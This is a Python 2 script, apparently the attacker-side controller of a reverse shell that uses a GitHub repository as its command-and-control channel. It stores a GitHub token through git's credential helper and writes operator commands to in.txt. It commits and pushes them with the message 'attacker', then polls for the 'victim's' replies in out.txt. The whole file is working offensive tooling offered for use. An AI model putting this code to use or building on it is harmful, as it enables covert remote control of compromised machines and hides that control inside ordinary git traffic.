#!/usr/bin/python
import git           # Interacting with git
from git import Repo # Interacting with git Repositories
import shutil        # for conveniently deleting local folder
import hashlib       # for getting hash of file
import pexpect       # for interacting with shell
from subprocess import Popen, PIPE, STDOUT
import commands
import argparse
import sys
import os
import time

def main():
    
   if(os.path.exists(args.path)):
      answer = raw_input("path already exists Should I delete that folder and all its contents? [y/n]? ")
      if(answer == "y"):
         shutil.rmtree(args.path, ignore_errors=True) # rm -r <path>

   # Git Clone - copy down the target repo
   print "Cloning " + args.url + " down to " + args.path
   Repo.clone_from(args.url, args.path)

   localrepo = git.Repo(args.path)              # object ref to local path 
   infile = os.path.join(args.path, 'in.txt')   # full path to in.txt
   outfile = os.path.join(args.path, 'out.txt') # full path to out.txt

   print "infile: " +  infile
   print "outfile: " + outfile
   
   # Being in the git folder is pretty useful throughout.
   os.chdir(args.path)

   # calculate the checksum of the outfile currently
   outhash = hashlib.md5(open(outfile, 'rb').read()).hexdigest()
   print "outhash: " + outhash
   
   try:
      setupAuthentication()
      print "Have set your GitHub authentication token for you!"
   except:
      print "User was already authenticated to GitHub"
       
   while True:
      # git pull - check for changes
      #print "git pull - synching remote to local"
      #localrepo.remotes.origin.pull()
      gitPull(localrepo)

      # check if outfile has changed
      #if(outhash != hashlib.md5(open(outfile, 'rb').read()).hexdigest()):
      # display updated output and update outhash
      displayOutput(outfile)
      outhash = hashlib.md5(open(outfile, 'rb').read()).hexdigest()

      # prompt user for input, this blocks the loop on this side until attacker issues command
      cmd = raw_input("# ")
      if(cmd != ''):
         # save cmd into "in.txt"
         setIn(infile, cmd)
         # git commit - commit changs to "in.txt" in local repo
         gitCommit(localrepo, infile)
         # git push - push to remote
         gitPush(localrepo)
         time.sleep(5)
         # wait for victim to commit response.
         getResponse()
      else:
         # delay for 2 seconds
         print "Waiting 5 seconds"
         time.sleep(5)
      

def getResponse():
   #print "== getResponse "
   count = 0
   while True:
      count = count+1
      print "checking remote repo for updates loop #" + str(count)
      status, output = commands.getstatusoutput("git fetch")
      #print output
      if(len(output) != 0):
         print "Victim updated repo!"
         return # exit getResponse

# This executes a "push" request to trigger a github authentication prompt.
# It then enters the credentials for you.
# Token authentcation works with the token as the username and a blank password.
def setupAuthentication():
   # We need to setup authentication for github.
   # This one tells git to save credentials

   os.system("git config credential.helper store")
   print "credential.helper store executed"   
   child = pexpect.spawn('git push origin master')
   child.expect("Username*", timeout=2)
   child.sendline(args.token)
   child.expect("Password*", timeout=2)
   child.sendline("")
   child.expect(pexpect.EOF)

# git push - pushes local changes up to remote
def gitPush(localrepo):
   #print "== gitPush" 
   #localrepo.remotes.origin.push()
   #os.system("git push origin master")
   proc = Popen(['git', 'push', 'origin','master'], stdout=PIPE, stderr=STDOUT)
   status, output = commands.getstatusoutput("git push origin master")

# git commit - commits the latest "in.txt" locally
def gitCommit(localrepo, infile):
   #print "== gitCommit" 
   #os.system("git add in.txt")
   status, output = commands.getstatusoutput("git add in.txt")
   #print output
   status, output = commands.getstatusoutput("git commit -m 'attacker'")
   #print output

   #proc = Popen('cd ' + args.path + '/ && git add in.txt', stdout=PIPE, stderr=STDOUT)
   #proc = Popen('cd ' + args.path + '/ && git commit -m \'attacker\'', stdout=PIPE, stderr=STDOUT)
   #os.system("git commit -m 'attacker'")

def gitPull(localrepo):
   #proc = Popen(['git', 'pull'], stdout=PIPE, stderr=STDOUT)
  # print "== gitPull"
   status, output = commands.getstatusoutput("git pull")
  # print output
        

# display the contents of "out.txt"
# this may have crypto to deal with soon.
def displayOutput(outfile):
    #print "== displayOutput"
    with open(outfile) as f:
      print f.read()

# save the attacker's command into "in.txt"
# this may have crypto to deal with soon.
def setIn(infile, cmd):
   f = open(infile,'w')
   f.write(cmd)
   f.close()

################################################################################
################################################################################

def usage():
   return "== Example Usage ==\n\n" + sys.argv[0] + " -u https://github.com/username/repo -p /tmp/gitshell -t 11111111111111111111111111"

# Defining the arguments and parsing the args.
parser = argparse.ArgumentParser(
  description='Using a GitHub repository to deliver a reverse shell',
  epilog=usage(),
  formatter_class=argparse.RawDescriptionHelpFormatter)
parser._action_groups.pop()

required = parser.add_argument_group('required arguments')

required.add_argument("-u", "--url", type=str, help="URL to github repo you will communicate through", required=True)
required.add_argument("-p", "--path",type=str,  help="Local path to clone repo to", required=True)
required.add_argument("-t", "--token",type=str,  help="GitHub authentication token", required=True)

try:

   args = parser.parse_args()

except:
   #print sys.exc_info()
   #parser.print_help()
   sys.exit(0)

main()
